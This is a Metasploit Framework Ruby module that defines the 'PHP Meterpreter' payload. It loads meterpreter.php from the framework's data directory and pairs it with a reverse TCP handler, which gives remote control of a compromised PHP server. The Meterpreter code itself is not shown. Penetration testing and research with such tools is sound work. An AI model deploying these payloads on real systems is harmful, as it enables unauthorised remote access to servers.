##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
	include Msf::Payload::Single
	include Msf::Sessions::MeterpreterOptions

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'PHP Meterpreter',
			'Version'       => '$Revision: 8984 $',
			'Description'   => 'Run a meterpreter server in PHP',
			'Author'        => ['egypt'],
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'License'       => MSF_LICENSE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::Meterpreter_Php_Php))
	end

	def generate
		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
		met = File.open(file, "rb") {|f|
			f.read(f.stat.size)
		}
		met
	end
end
